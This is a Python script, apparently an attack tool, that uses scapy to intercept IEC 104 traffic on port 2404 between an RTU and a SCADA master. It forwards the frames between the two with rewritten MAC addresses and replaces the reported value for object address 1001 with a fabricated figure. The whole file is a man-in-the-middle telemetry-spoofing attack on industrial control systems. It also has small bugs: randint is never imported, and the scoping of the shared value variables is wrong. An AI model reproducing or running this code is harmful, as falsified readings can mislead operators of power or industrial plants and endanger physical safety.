#!/usr/bin/env python3

import sys
import signal
from threading import Thread
from collections import Counter, deque
from copy import deepcopy
from hashlib import md5
from time import sleep
import scapy.all as scapy
from .IEC104_Raw.dissector import *

def getMAC(ip: str, interface: str) -> str:
    ans, unans = scapy.srp(scapy.Ether(dst='ff:ff:ff:ff:ff:ff')/scapy.ARP(op=1, pdst=ip), iface=interface, verbose=0)
    for snd, rcv in ans:
        return rcv.sprintf(r'%Ether.src%')

if __name__ == '__main__':
    interface = input('Enter interface: ')
    rtuIP = input('Enter RTU IP: ')
    scadaIP = input('Enter SCADA IP: ')
    rtuMAC = getMAC(rtuIP, interface)
    scadaMAC = getMAC(scadaIP, interface)
    myMAC = scapy.get_if_hwaddr(interface)
    value_out = None
    value_store = None
    altered = deque(list(), 10)

    ## Setup sniff, filtering for IP traffic
    def custom_action(packet):
        global rtuMAC
        global rtuIP
        global scadaMAC
        global scadaIP
        global myMAC

        p = deepcopy(packet)
        # if md5(bytes(p)).hexdigest() in altered:
        #     return None
        # if not str(packet['Ether'].dst).lower() == 'ff:ff:ff:ff:ff:ff':
        print(p['Ethernet'].src, p['Ethernet'].dst)
        if str(packet['Ether'].src).lower() == rtuMAC and str(packet['Ether'].dst).lower() == myMAC:
            p['Ether'].src = myMAC
            p['Ether'].dst = scadaMAC
        elif str(packet['Ether'].src).lower() == scadaMAC and str(packet['Ether'].dst).lower() == myMAC:
            p['Ether'].src = myMAC
            p['Ether'].dst = rtuMAC
            
            if packet.haslayer('TCP') and (packet['TCP'].sport == 2404 or packet['TCP'].dport == 2404):

                if p.haslayer('IOA36') and p['IOA36'].IOA == 1001:
                    value = float(p['IOA36'].Value)
                    if value != value_store:
                        value_store = value
                        if value_out is None:
                            value_out = 520000.0 + float(randint(100,100000)) / 100.0
                        else:
                            value_out -= 500 + float(randint(100,10000)) / 100.0
                    p['IOA36'].Value = value_out
                p['IP'].chksum =  None
                p['TCP'].chksum = None
                    
            # altered.append(md5(bytes(p)).hexdigest())
        else:
            return
        scapy.sendp(p, iface=interface, verbose=0)

    scapy.sniff(iface=interface, filter="ip", prn=custom_action)

